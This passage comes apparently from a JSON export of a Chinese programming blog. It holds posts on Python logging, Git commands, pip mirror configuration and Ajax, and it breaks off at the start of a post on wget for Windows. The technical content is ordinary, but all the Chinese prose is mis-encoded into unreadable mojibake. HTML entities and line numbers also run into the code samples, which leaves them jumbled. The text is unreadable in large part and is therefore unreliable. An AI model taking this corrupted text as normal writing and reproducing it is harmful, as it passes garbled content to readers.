debug message\")logging.info(\"A info message\")logging.warn(\"A warning message\")logging.error(\"A error message\")logging.critical(\"A critical message\")æ—¥å¿—çº§åˆ«ï¼šloggingé»˜è®¤çš„æ—¥å¿—çº§åˆ«ä¸ºWARNINGï¼Œåœ¨å½“å‰çº§åˆ«ä¸‹ï¼Œåªæœ‰warningåŠä»¥ä¸Šçš„æ—¥å¿—å¯ä»¥è¢«è®°å½•ã€‚loggingçš„çº§åˆ«å¯é€šè¿‡logging.basicConfigæˆ–logging.setLevelæ¥ä¿®æ”¹ã€‚çº§åˆ«å¤§å°å…³ç³»ä¸ºCRITICAL(50) &gt; ERROR(40) &gt; WARNING(30) &gt; INFO(20) &gt; DEBUG(10) &gt; NOTSET(0), éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€æ—¦è®°å½•ä¿¡æ¯ï¼Œloggingçš„æ—¥å¿—çº§åˆ«å°±ä¸å¯å†æ›´æ”¹ã€‚12345&gt;&gt;&gt; logging.basicConfig(level=logging.INFO)&gt;&gt;&gt; logging.info(\"Info\")INFO:root:Info&gt;&gt;&gt; logging.basicConfig(level=logging.DEBUG)&gt;&gt;&gt; logging.debug(\"Debug\") # æ²¡æœ‰è¾“å‡º 3. æ—¥å¿—æ ¼å¼è®¾ç½®åŠæ—¥å¿—æ–‡ä»¶æ“ä½œ12345678910111213import loggingimport timelogging.basicConfig(format=\"%(asctime)s %(levelname)s %(message)s\", datefmt=\"%Y %b %d %H:%M:%S\", filename=\"./log.log\", filemode=\"w\", # default is \"a\" level=logging.INFO)while True: for i in range(6): logging.log(i*10, \"a log\") # logging.log(level, msg) time.sleep(1)log.logè¾“å‡º(å¯ä»¥ç”¨tail -få‘½ä»¤å®æ—¶æŸ¥çœ‹):123456782015 Oct 21 14:41:36 INFO a log2015 Oct 21 14:41:37 WARNING a log2015 Oct 21 14:41:38 ERROR a log2015 Oct 21 14:41:41 CRITICAL a log2015 Oct 21 14:41:42 INFO a log2015 Oct 21 14:41:43 WARNING a log2015 Oct 21 14:41:44 ERROR a log2015 Oct 21 14:41:45 CRITICAL a log 4. å°†æ—¥å¿—è¾“å‡ºåˆ°å¤šä¸ªæµä¸­12345678910111213141516171819import loggingimport sys# å¯ä»¥é€šè¿‡logging.basicConfigè®¾ç½®ä¸€ä¸ªé»˜è®¤æµconsole = logging.StreamHandler(stream=sys.stdout) # é»˜è®¤æµä¸ºsys.stderrconsole.setLevel(logging.INFO)formatter = logging.Formatter('%(name)-12s: %(levelname)-8s %(message)s')console.setFormatter(formatter)logging.getLogger().addHandler(console)files = logging.FileHandler(\"log2.log\", mode=\"a\", encoding=\"utf-8\") # è®¾ç½®æ–‡ä»¶æµfiles.setLevel(logging.WARNING)formatter = logging.Formatter(\"%(levelname)s %(message)s\")files.setFormatter(formatter)logging.getLogger().addHandler(files)for i in range(1, 6): logging.log(i*10, logging.getLevelName(i*10).lower()) 5. è®¾ç½®å¤šä¸ªloggerä»¥è®°å½•ä¸åŒä¿¡æ¯123456789101112131415161718192021222324252627# coding: utf-8import loggingimport syslog1 = logging.Logger(\"0.0\")console = logging.StreamHandler(sys.stdout) # é»˜è®¤æµä¸ºsys.stderrconsole.setLevel(logging.INFO)formatter = logging.Formatter('%(name)-12s: %(levelname)-8s %(message)s')console.setFormatter(formatter)log1.addHandler(console)log2 = logging.Logger(\"-.-\")files = logging.FileHandler(\"log2.log\", mode=\"a\", encoding=\"utf-8\") # è®¾ç½®æ–‡ä»¶æµfiles.setLevel(logging.WARNING)formatter = logging.Formatter(\"%(name)s %(levelname)s %(message)s\")files.setFormatter(formatter)log2.addHandler(files)for i in range(1, 6): log1.log(i*10, logging.getLevelName(i*10).lower()) log2.log(i*10, logging.getLevelName(i*10).lower())logging.critical(\"AHHH! I'm the root logger but you forget me!\") # é»˜è®¤ä½¿ç”¨loggingæ—¶logger nameä¸º\"root\"logging.getLogger(\"root\").info(\"Of course not!\") 5. å‚è€ƒæ–‡æ¡£Logging HOWTOpython çš„æ—¥å¿—loggingæ¨¡å—å­¦ä¹  6. åè®°åˆå¡«å®Œä¸€ä¸ªå‘ï¼Œæœ€è¿‘è¦å¡«çš„å‘å¥½å¤šâ€¦","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"logging","slug":"logging","permalink":"https://blog.stdioa.com/tags/logging/"}]},{"title":"éšæ‰‹è®°ä¹‹Git","slug":"essay-git","date":"2015-10-14T10:28:00.000Z","updated":"2017-06-29T04:38:40.067Z","comments":true,"path":"2015/10/essay-git/","link":"","permalink":"https://blog.stdioa.com/2015/10/essay-git/","excerpt":"ä»ä¸€å¹´å‰å¼€å§‹ä½¿ç”¨Git, ä¸€ç›´æ²¡ç³»ç»Ÿæ•´ç†è¿‡Gitçš„å‘½ä»¤ï¼Œå‰å‡ å¤©åœ¨éƒ¨ç½²ä»£ç çš„æ—¶å€™å‡ºäº†é—®é¢˜ä¸çŸ¥é“è¯¥å¦‚ä½•è§£å†³ï¼Œäºæ˜¯å†³å®šæ•´ç†ä¸€ä»½Gitçš„ä½¿ç”¨æ–¹æ³•ã€‚æœ¬åšæ–‡ä¼šæŒç»­æ›´æ–°ã€‚","text":"ä»ä¸€å¹´å‰å¼€å§‹ä½¿ç”¨Git, ä¸€ç›´æ²¡ç³»ç»Ÿæ•´ç†è¿‡Gitçš„å‘½ä»¤ï¼Œå‰å‡ å¤©åœ¨éƒ¨ç½²ä»£ç çš„æ—¶å€™å‡ºäº†é—®é¢˜ä¸çŸ¥é“è¯¥å¦‚ä½•è§£å†³ï¼Œäºæ˜¯å†³å®šæ•´ç†ä¸€ä»½Gitçš„ä½¿ç”¨æ–¹æ³•ã€‚æœ¬åšæ–‡ä¼šæŒç»­æ›´æ–°ã€‚ 1. ä»€ä¹ˆæ˜¯GitLinuså¤§ç¥å†™çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œå…·ä½“è¯·è®¿é—®å®˜ç½‘http://git-scm.com.Wikipediaé“¾æ¥: Git (software) 2. åŸºæœ¬æ“ä½œåˆå§‹åŒ–ç‰ˆæœ¬ä»“åº“: git initä»è¿œç¨‹ä»“åº“å…‹éš†: git clone [url] [repo_name]ä¾‹: git clone https://github.com/user/repo my_repoæ–‡ä»¶çš„çŠ¶æ€å˜åŒ–å‘¨æœŸæ£€æŸ¥æ–‡ä»¶çŠ¶æ€: git statusçŠ¶æ€ç®€è§ˆ: git status -s123456$ git status -s M READMEMM RakefileA lib/git.rbM lib/simplegit.rb?? LICENSE.txtå­—æ¯æ‰€ä»£è¡¨çš„çŠ¶æ€??æœªè¿½è¸ªMå·²ä¿®æ”¹ï¼Œæœªæš‚å­˜MMä¿®æ”¹åæš‚å­˜ï¼Œç„¶ååˆä¿®æ”¹Aæ–°æ·»åŠ åˆ°æš‚å­˜åŒºMä¿®æ”¹åæ·»åŠ åˆ°æš‚å­˜åŒºå¿½ç•¥æ–‡ä»¶ï¼š ç¼–è¾‘.gitignoreæ–‡ä»¶ã€‚æ–‡ä»¶ .gitignore çš„æ ¼å¼è§„èŒƒå¦‚ä¸‹ï¼šæ‰€æœ‰ç©ºè¡Œæˆ–è€…ä»¥ ï¼ƒ å¼€å¤´çš„è¡Œéƒ½ä¼šè¢« Git å¿½ç•¥ã€‚å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„ glob æ¨¡å¼åŒ¹é…ã€‚åŒ¹é…æ¨¡å¼å¯ä»¥ä»¥ï¼ˆ/ï¼‰å¼€å¤´é˜²æ­¢é€’å½’ã€‚åŒ¹é…æ¨¡å¼å¯ä»¥ä»¥ï¼ˆ/ï¼‰ç»“å°¾æŒ‡å®šç›®å½•ã€‚è¦å¿½ç•¥æŒ‡å®šæ¨¡å¼ä»¥å¤–çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¯ä»¥åœ¨æ¨¡å¼å‰åŠ ä¸ŠæƒŠå¹å·ï¼ˆ!ï¼‰å–åã€‚å…·ä½“ä¾‹å­è§Git-åŸºç¡€ã€‚æŸ¥çœ‹å°šæœªæš‚å­˜çš„æ–‡ä»¶æ›´æ–°éƒ¨åˆ†: git diffæŸ¥çœ‹å·²æš‚å­˜çš„æ–‡ä»¶æ›´æ–°çš„éƒ¨åˆ†: git diff --stagedæäº¤æ›´æ–°: git commitgit commit -a = git add --all; git commitæäº¤æ—¶è¾“å…¥å•è¡Œä¿¡æ¯(Commit log): git commit -mæ·»åŠ æ–‡ä»¶: git add [filename], ä½¿gitè·Ÿè¸ªæ–‡ä»¶åˆ é™¤æ–‡ä»¶: git rm [filename], ä½¿gitåœæ­¢è·Ÿè¸ªæ–‡ä»¶å¹¶å°†æ–‡ä»¶åˆ é™¤åœæ­¢è·Ÿè¸ªæ–‡ä»¶: git rm --cached, åœæ­¢è·Ÿè¸ªä½†ä¸åˆ é™¤æ–‡ä»¶ç§»åŠ¨æ–‡ä»¶: git mv, è§„åˆ™å’ŒmvåŸºæœ¬ç›¸åŒæŸ¥çœ‹æäº¤å†å²: git logæ˜¾ç¤ºæ¯æ¬¡æäº¤çš„å†…å®¹å·®å¼‚: git log -pæŸ¥çœ‹æ¯æ¬¡æäº¤çš„ç®€ç•¥ç»Ÿè®¡ä¿¡æ¯: git log --statæŸ¥çœ‹æ¯æ¬¡æäº¤çš„ä»£ç æ›´æ”¹è¯¦æƒ…ï¼šgit log --ccæ˜¾ç¤ºASCIIå›¾å½¢è¡¨ç¤ºçš„åˆ†æ”¯åˆå¹¶å†å²: git log --graphç²—ç•¥æ˜¾ç¤º: git log --oneline --graph --decorate --allæ›´å¤šè¯·è¾“å…¥git log --helpæŸ¥çœ‹man page.æ›´æ”¹ä¸Šæ¬¡æäº¤: git commit --amendå–æ¶ˆæš‚å­˜: git reset HEAD [filename]å–æ¶ˆæš‚å­˜å¹¶ä¸¢å¼ƒç°æœ‰çš„æ›´æ”¹: git reset HEAD --hard [filename], æœªæäº¤çš„æ›´æ”¹ä¼šä¸¢å¤±æ’¤é”€å¯¹æ–‡ä»¶çš„æ›´æ”¹: git checkout -- [filename], æœªæäº¤çš„æ›´æ”¹ä¼šä¸¢å¤±git push origin --delete [branch], åˆ é™¤è¿œç¨‹åˆ†æ”¯ 3. åˆ†æ”¯æ“ä½œgit branch [branch], åœ¨å½“å‰å¼•ç”¨ä¸Šå»ºç«‹æ–°åˆ†æ”¯git checkout -b [branch], å»ºç«‹æ–°åˆ†æ”¯å¹¶æ£€å‡ºåˆ°è¯¥åˆ†æ”¯ä¸Šcommitå¼•ç”¨æ–¹å¼:ç›´æ¥hashå¼•ç”¨: d921970aadf03b3cf0e71becdaab3147ba71cdef, d921970åˆ†æ”¯å¼•ç”¨: HEAD, masterç›¸å¯¹å¼•ç”¨: HEAD^, HEAD^^, HEAD~2è‹¥aæ˜¯ä¸€ä¸ªåˆå¹¶æäº¤ï¼Œæœ‰ä¸¤ä¸ªçˆ¶å¼•ç”¨ï¼Œåˆ™a^ä¸ºaçš„ç¬¬ä¸€çˆ¶å¼•ç”¨ï¼Œa^2ä¸ºaçš„ç¬¬äºŒçˆ¶å¼•ç”¨ã€‚æ¡ä»¶å¼•ç”¨: master@{yesterday}, master@{1.week.before}å¼•ç”¨åŒºé—´:refA..refBé€‰æ‹©ä»refAå’ŒrefBçš„å…±åŒç¥–å…ˆå¼€å§‹ç›´åˆ°refBçš„æ‰€æœ‰æäº¤ã€‚ä¾‹:1234è‹¥ 1 - 2 - 3 - 4 â† refA \\ 5 - 6 â† refBrefA..refB å³ä¸º6 5, refB..refA å³ä¸º4 3.origin/master..masterä¸ºmasteråˆ†æ”¯ä¸Šè¿˜æœªæäº¤åˆ°è¿œç«¯çš„æ‰€æœ‰å¼•ç”¨åŒºé—´ç­›é€‰ï¼Œä¾‹ï¼šä»¥ä¸‹ä¸‰æ¡å‘½ä»¤ç­‰ä»·ï¼š$ git log refA..refB$ git log ^refA refB$ git log refB --not refArefA...refBé€‰æ‹©å‡ºè¢«ä¸¤ä¸ªå¼•ç”¨ä¸­çš„ä¸€ä¸ªåŒ…å«ä½†åˆä¸è¢«ä¸¤è€…åŒæ—¶åŒ…å«çš„æäº¤ï¼Œå³refA..refB+refB..refA12345$ git log --left-to-right refA...refB&lt; 4&lt; 3&gt; 6&gt; 5 4. å·¥ä½œå‚¨è—git stash &quot;comments&quot;, å‚¨è—æ‰€æœ‰å·¥ä½œï¼ŒåŒ…æ‹¬å·²æ·»åŠ çš„å’Œå·²æ›´æ”¹æœªæ·»åŠ çš„git stash apply stash@{0}, æ¢å¤å‚¨è—ï¼Œå¯èƒ½ä¼šäº§ç”Ÿå†²çªï¼Œè§£å†³å†²çªågit addæ·»åŠ git stash list, åˆ—å‡ºå‚¨è—æ ˆgit stash show [stashname], æŸ¥çœ‹å‚¨è—çš„æ›´æ”¹git stash pop, åº”ç”¨æ ˆé¡¶å‚¨è—å¹¶å¼¹å‡ºå‚¨è—git stash drop [stashname], åˆ é™¤å‚¨è—git stash branch [branchname], åº”ç”¨å‚¨è—åˆ°æŸåˆ†æ”¯å¹¶åˆ‡æ¢åˆ°è¯¥åˆ†æ”¯git stash --keep-index, åªå‚¨è—å·²æ›´æ”¹æœªæ·»åŠ çš„æ”¹åŠ¨ï¼Œä¸å‚¨è— å·²æ·»åŠ çš„git stash --include-untracked, å‚¨è—æœªè¿½è¸ªçš„æ–‡ä»¶ï¼ˆæœªè¿½è¸ªæ–‡ä»¶ï¼‰å¹¶å°†å…¶ä»å·¥ä½œç›®å½•ä¸­åˆ é™¤git stash --all, è´®è—æ‰€æœ‰æ–‡ä»¶ 5. git resetgit reset --soft HEAD^, å°†HEADæŒ‡é’ˆåŠå½“å‰åˆ†æ”¯æŒ‡é’ˆæŒ‡å‘HEAD^, å·¥ä½œç›®å½•ä¸­æ‰€æœ‰çš„æ–‡ä»¶å‡æ·»åŠ æš‚å­˜(staged), ç±»ä¼¼â€œæ’¤é”€git commitå‘½ä»¤â€ï¼Œä½†å¦‚æœé‡æ–°æäº¤ï¼Œä¼šåˆ›é€ ä¸€ä¸ªhashä¸åŒçš„commitï¼Œå³æ—¶æäº¤å†…å®¹å®Œå…¨ç›¸åŒã€‚git reset --mixed HEAD^, å°†HEADæŒ‡é’ˆåŠå½“å‰åˆ†æ”¯æŒ‡é’ˆæŒ‡å‘HEAD^, å·¥ä½œç›®å½•ä¸­çš„æ›´æ”¹æœªæš‚å­˜(modified but not staged), ç±»ä¼¼â€œæ’¤é”€git addå’Œgit commitå‘½ä»¤â€git reset --hard HEAD^, å°†HEADæŒ‡é’ˆåŠå½“å‰åˆ†æ”¯æŒ‡é’ˆæŒ‡å‘HEAD^, å·¥ä½œç›®å½•ä¸­çš„æ›´æ”¹å®Œå…¨ä¸¢å¤±ï¼Œç›¸å½“äºâ€œæ’¤é”€æ›´æ”¹, git addå’Œgit commitâ€.","categories":[{"name":"éšæ‰‹è®°","slug":"éšæ‰‹è®°","permalink":"https://blog.stdioa.com/categories/éšæ‰‹è®°/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://blog.stdioa.com/tags/Git/"},{"name":"ç¼–ç¨‹å·¥å…·","slug":"ç¼–ç¨‹å·¥å…·","permalink":"https://blog.stdioa.com/tags/ç¼–ç¨‹å·¥å…·/"}]},{"title":"éšæ‰‹è®° - ç”¨å›½å†…é•œåƒåŠ é€Ÿpip","slug":"essay-pip-acceleration","date":"2015-09-29T15:01:00.000Z","updated":"2017-06-29T04:38:40.114Z","comments":true,"path":"2015/09/essay-pip-acceleration/","link":"","permalink":"https://blog.stdioa.com/2015/09/essay-pip-acceleration/","excerpt":"åŸæ¥Windowså’ŒLinuxæ›´æ”¹é•œåƒæºçš„æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„å•Šã€‚","text":"åŸæ¥Windowså’ŒLinuxæ›´æ”¹é•œåƒæºçš„æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„å•Šã€‚ 1. å¼•å­å¶ç„¶å‘ç°USTCæœ‰ä¸€ä¸ªpypiçš„æº(åœ¨è¿™é‡Œ)ï¼Œç…§ç€USTCç»™çš„é•œåƒä½¿ç”¨å¸®åŠ©æ›´æ”¹é•œåƒæºæ— æœã€‚ä»Šå¤©é—²æ¥æ— äº‹å°±å¤šæœäº†ä¸€ä¸‹ã€‚ 2. è¿‡ç¨‹USTCçš„é•œåƒä½¿ç”¨å¸®åŠ©é‡Œè¯´ï¼Œå°†index-url = https://pypi.mirrors.ustc.edu.cn/simpleæ·»åŠ åˆ°~/.pip/pip.confæ–‡ä»¶ä¸­ï¼ŒæŒ‰ç…§æ­¤æ€è·¯çœ‹ï¼Œå¦‚æœæˆ‘åœ¨Windowsä¸‹ä½¿ç”¨çš„è¯ï¼Œåº”è¯¥å°†é…ç½®ä¿¡æ¯æ·»åŠ åˆ°C:\\Users\\Stdio\\.pip\\pip.confæ–‡ä»¶ä¸­ã€‚ç„¶è€Œæ·»åŠ åå¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ã€‚ä»Šå¤©çœ‹è§ä¸€ä¸ªåšæ–‡è¯´æ–‡ä»¶è®¾ç½®è·¯å¾„åº”ä¸º%HOME%\\pip\\pip.iniï¼Œäºæ˜¯è¯•äº†ä¸€ä¸‹ï¼ˆç»å¯¹è·¯å¾„ä¸ºC:\\Users\\Stdio\\pip\\pip.iniï¼‰ï¼ŒæˆåŠŸã€‚ç”¨äº†USTCçš„æºï¼Œè£…ä¸ªè½¯ä»¶é€Ÿåº¦ç®€ç›´é£èµ·ï¸¿(ï¿£ï¸¶ï¿£)ï¸¿å¼„å¥½ä»¥åå¤šäº†ä¸ªå¿ƒçœ¼ï¼Œå»çœ‹çœ‹å®˜æ–¹æ€ä¹ˆè¯´ï¼Œäºæ˜¯æ‰¾åˆ°äº†pipçš„Documentationï¼ˆåœ¨è¿™é‡Œï¼‰é‡Œé¢è®²è¿°äº†é…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®ã€‚1234567891011121314151617181920Config filepip allows you to set all command line option defaults in a standard ini style config file.The names and locations of the configuration files vary slightly across platforms. You may have per-user, per-virtualenv or site-wide (shared amongst all users) configuration:Per-user:On Unix the default configuration file is: $HOME/.config/pip/pip.conf which respects the XDG_CONFIG_HOME environment variable.On Mac OS X the configuration file is $HOME/Library/Application Support/pip/pip.conf.On Windows the configuration file is %APPDATA%\\pip\\pip.ini.There are also a legacy per-user configuration file which is also respected, these are located at:On Unix and Mac OS X the configuration file is: $HOME/.pip/pip.confOn Windows the configuration file is: %HOME%\\pip\\pip.iniYou can set a custom path location for this config file using the environment variable PIP_CONFIG_FILE.Inside a virtualenv:On Unix and Mac OS X the file is $VIRTUAL_ENV/pip.confOn Windows the file is: %VIRTUAL_ENV%\\pip.iniäºæ˜¯è‡ªå·±å°†é…ç½®æ–‡ä»¶æ”¾åœ¨äº†%APPDATA%\\pip\\pip.iniï¼Œå³C:\\Users\\Stdio\\AppData\\Roaming\\pip\\pip.iniä¸‹ï¼Œç»å®éªŒï¼ŒåŠ é€ŸæˆåŠŸã€‚ç»æµ‹è¯•ï¼Œç³»ç»Ÿå±‚é¢çš„å…¨å±€è®¾ç½®ä¼šå½±å“åˆ°virtualenvå»ºç«‹çš„è™šæ‹Ÿç¯å¢ƒè®¾ç½®ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è®¾ç½®è™šæ‹Ÿç¯å¢ƒçš„é…ç½®æ–‡ä»¶æ¥æ›´æ”¹è™šæ‹Ÿç¯å¢ƒè®¾ç½®ï¼Œè®¾ç½®æ–‡ä»¶å°±æ”¾åœ¨è™šæ‹Ÿç¯å¢ƒæ ¹ç›®å½•ä¸‹å°±å¥½äº†ã€‚ 3. çå†™æ”¹äº†è½¯ä»¶æºä»¥åä¸ºäº†åšæµ‹è¯•å‡çº§äº†numpyï¼Œç„¶åç¼–è¯‘ç”¨äº†åŠå¤©ä¸­é—´ç”µè„‘å¡åˆ°æ­»ï¼Œç°åœ¨å®ƒè¿˜åœ¨æˆ‘çš„è…¿ä¸Šå‘çƒ«çœŸæ˜¯ä¼¤ä¸èµ·- -å†™çš„ä¸œè¥¿è¶Šæ¥è¶Šæ²¡æœ‰è¥å…»äº†ï¼Œå°±å½“æ˜¯å†™ç€ç©é¡ºå¸¦ç§¯ç´¯ä¸€ä¸‹çŸ¥è¯†å§ã€‚å¦‚æœä¸å‡ºæ„å¤–çš„è¯ï¼Œä¸‹ä¸€ç¯‡åº”è¯¥æ˜¯å…³äºPython Qt Createrå’ŒQt GUIè®¾è®¡çš„å°æ–‡ç« 0.0ä¹Ÿè®¸æ˜¯virtualenvçš„éšæ‰‹è®°å§ã€‚","categories":[{"name":"éšæ‰‹è®°","slug":"éšæ‰‹è®°","permalink":"https://blog.stdioa.com/categories/éšæ‰‹è®°/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"pip","slug":"pip","permalink":"https://blog.stdioa.com/tags/pip/"}]},{"title":"ç‚¹ç‚¹æŠ€èƒ½ç‚¹ä¹‹Ajax","slug":"essay-ajax","date":"2015-09-22T13:07:00.000Z","updated":"2017-06-29T04:38:40.033Z","comments":true,"path":"2015/09/essay-ajax/","link":"","permalink":"https://blog.stdioa.com/2015/09/essay-ajax/","excerpt":"ä¹‹å‰è‡ªå·±æ²¡æ€ä¹ˆå†™è¿‡å‰ç«¯ï¼Œä¸€ç›´ä»¥ä¸ºAjaxå†™èµ·æ¥å¾ˆéº»çƒ¦ï¼Œä¹Ÿæ²¡æ€ä¹ˆæ¥è§¦Ajaxï¼Œä»Šå¤©å†™äº†ä¸ªå°ç½‘é¡µç”¨åˆ°äº†Ajaxï¼Œæ„Ÿè§‰å®ƒå¹¶ä¸æ˜¯æƒ³è±¡çš„é‚£ä¹ˆå¤æ‚ï¼Œå†™å®Œç½‘é¡µéšæ‰‹æ€»ç»“ä¸€ä¸‹ã€‚ï¼ˆå–‚æˆ‘è¿™ä¸ªæŠ€èƒ½ç‚¹æ˜¯ä¸æ˜¯ç‚¹çš„å¤ªæ™šäº†å•Šï¼ï¼‰","text":"ä¹‹å‰è‡ªå·±æ²¡æ€ä¹ˆå†™è¿‡å‰ç«¯ï¼Œä¸€ç›´ä»¥ä¸ºAjaxå†™èµ·æ¥å¾ˆéº»çƒ¦ï¼Œä¹Ÿæ²¡æ€ä¹ˆæ¥è§¦Ajaxï¼Œä»Šå¤©å†™äº†ä¸ªå°ç½‘é¡µç”¨åˆ°äº†Ajaxï¼Œæ„Ÿè§‰å®ƒå¹¶ä¸æ˜¯æƒ³è±¡çš„é‚£ä¹ˆå¤æ‚ï¼Œå†™å®Œç½‘é¡µéšæ‰‹æ€»ç»“ä¸€ä¸‹ã€‚ï¼ˆå–‚æˆ‘è¿™ä¸ªæŠ€èƒ½ç‚¹æ˜¯ä¸æ˜¯ç‚¹çš„å¤ªæ™šäº†å•Šï¼ï¼‰ 1. å¼•å­æ²¡å•¥å¯å†™çš„â€¦ 2. ç§‘æ™®W3School - Ajaxæ•™ç¨‹ï¼Œå°±è¿™ä¸ªå§ï¼Œç§‘æ™®å®Œæ¯•ã€‚ 3. ç¬”è®° 3.1 Ajaxçš„ç‰¹ç‚¹Ajaxä¸ºAsynchronous Javascript And XMLçš„ç¼©å†™ï¼Œå³å¼‚æ­¥JSä¸XMLï¼Œå› ä¸ºå®ƒå…·æœ‰å¼‚æ­¥ç‰¹æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ç½‘é¡µåŠ è½½ä¸­æˆ–åŠ è½½ç»“æŸçš„ä»»æ„æ—¶åˆ»ä½¿ç”¨ï¼Œé€šè¿‡ä¸æœåŠ¡å™¨è¿›è¡Œå°‘é‡æ•°æ®äº¤æ¢æ¥å®ç°ç½‘é¡µå¼‚æ­¥æ›´æ–°ã€‚åˆ©ç”¨Ajaxå¯ä»¥ç›´æ¥æ›´æ”¹ç½‘é¡µçš„ä¸€éƒ¨åˆ†æ¥åŠ¨æ€åˆ·æ–°ç½‘é¡µï¼Œè€Œä¸éœ€è¦åˆ·æ–°æ•´ä¸ªç½‘é¡µã€‚ 3.2 ä½¿ç”¨æ–¹æ³•â€”â€”åŸç”Ÿæ–¹å¼1234567891011var ajax = new XMLHttpRequest(); // IE6ä¸èƒ½ç”¨è¿™ä¸ªæ–¹å¼ï¼Œä¸ç®¡å®ƒäº†ajax.onreadystatechange = function() &#123; if(ajax.readyState==4 &amp;&amp; ajax.status==200) &#123; // do something with ajax.responseText // è¿˜æœ‰ä¸€ä¸ªajax.responseXML, ä¹Ÿä¸ç®¡å®ƒäº†ï¼Œjsonå¤§æ³•å¥½ alert(ajax.responseText); &#125;&#125;ajax.open(\"GET\", \"./get?var1=val1&amp;var2=val2\", true); // å¼‚æ­¥æ–¹å¼è¿è¡Œajax.send();123456var ajax = new XMLHttpRequest();ajax.open(\"POST\", \"./post\", false); // åŒæ­¥æ–¹å¼è¿è¡Œajax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");ajax.send(\"var1=val1&amp;var2=val2\");// do something with ajax.responseTextalert(ajax.responseText); 3.3 åŸç”Ÿçš„å¥½éº»çƒ¦ï¼â€”â€”jQuery AjaxjQueryï¼Œæ£’æ£’çš„å‰ç«¯åº“ï¼Œä¸å¤šè¯´ã€‚1234567891011121314151617// $.get(URL, callback)$.get(\"./get?var1=val1&amp;var2=val2\", function(data, status) &#123; // do something with data &amp; status &#125;);// $.post(URL,data,callback)$.post(\"./post\", &#123; var1: \"val1\", var2: \"val2\" &#125;, function(data, status) &#123; // do something with data &amp; status &#125;);// $.getJSON(url, data, success(data,status,xhr))// dataå’Œå›è°ƒå‡½æ•°successå¯é€‰// successä¸­ï¼Œdataå‚æ•°å¿…éœ€ï¼Œå…¶å®ƒå¯é€‰$.getJSON(\"./get\", function(data) &#123; // do something with data &#125;); 4. é™„å¸¦çš„å°é›¶ç¢window.setInterval(getData, time);ç”¨äºå®ç°è½®è¯¢ã€‚ 5. æ€»ç»“ &amp; åè®°Ajaxç®€å•å®ç”¨åŠŸèƒ½å¼ºå¤§åº”ç”¨å¹¿æ³›ï¼Œé€šè¿‡ç®€å•çš„æ­¥éª¤å®ç°å‰åç«¯çš„æ•°æ®äº¤æ¢ï¼Œæ¥å®ç°ç½‘é¡µçš„åŠ¨æ€åŠ è½½ã€‚å¼€å­¦åˆ°ç°åœ¨æ„Ÿè§‰ä¸€ç›´ä¸åœ¨çŠ¶æ€ï¼ˆå®åœ¨æ˜¯æƒ³åæ§½è‡ªå·±çš„ä¸€ç¾¤ç¥ä¸€æ ·çš„èˆå‹ï¼‰ï¼Œä»Šå¤©æ‰¾äº†ä¸ªå®‰é™çš„ã€æ²¡äººæ‰“æ‰°çš„åœ°æ–¹è®¤è®¤çœŸçœŸå†™äº†å†™ä»£ç ï¼Œæ€»ç»“äº†ä¸€ä¸‹è‡ªå·±åˆ°ç°åœ¨æ‰€å­¦çš„çŸ¥è¯†æ‰å‘ç°è‡ªå·±å­¦çš„ä¸œè¥¿æ˜¯å¦‚æ­¤é›¶æ•£ã€ä¸æˆä½“ç³»ï¼Œä»¿ä½›ä»å¤§ä¸€å¼€å§‹å°±åœ¨ä¹±ç‚¹æŠ€èƒ½ç‚¹ã€‚è¿™ä¸€å¹´è¦å¤šæ·±å…¥å­¦ä¹ ä¸€ä¸ªç‰¹å®šæ–¹é¢çš„çŸ¥è¯†ï¼ˆæš‚å®šåç«¯å¼€å‘ï¼‰ï¼Œå¤šå†™ä»£ç ç§¯ç´¯ç»éªŒï¼Œä¸èƒ½å†ä¸œå­¦ä¸€ç‚¹è¥¿å­¦ä¸€ç‚¹äº†ã€‚","categories":[{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://blog.stdioa.com/categories/ç½‘ç»œ/"}],"tags":[{"name":"Ajax","slug":"Ajax","permalink":"https://blog.stdioa.com/tags/Ajax/"},{"name":"å‰ç«¯å¼€å‘","slug":"å‰ç«¯å¼€å‘","permalink":"https://blog.stdioa.com/tags/å‰ç«¯å¼€å‘/"}]},{"title":"åœ¨Windowsä¸­ä½¿ç”¨Wget","slug":"using-wget-in-Windows","date":"2015-09-18T12:07:00.000Z","updated":"2017-06-29T04:38:40.669Z","comments":true,"path":"2015/09/using-wget-in-Windows/","link":"","permalink":"https://blog.stdioa.com/2015/09/using-wget-in-Windows/","excerpt":"ä¸€ç›´å¿ƒå¿ƒå¿µå¿µæƒ³åœ¨Windowsé‡Œç”¨wgetï¼Œä»Šå¤©éšä¾¿æäº†æï¼Œåœ¨Windowsé‡Œé¢ç”¨ä¸Šäº†wgetï¼Œç»ˆäºå¯ä»¥ä¸‹è½½ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„å°æ–‡ä»¶è¾£ã€‚","text":"ä¸€ç›´å¿ƒå¿ƒå¿µå¿µæƒ³åœ¨Windowsé‡Œç”¨wgetï¼Œä»Šå¤©éšä¾¿æäº†æï¼Œåœ¨Windowsé‡Œé¢ç”¨ä¸Šäº†wgetï¼Œç»ˆäºå¯ä»¥ä¸‹è½½ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„å°æ–‡ä»¶è¾£ã€‚ 1. 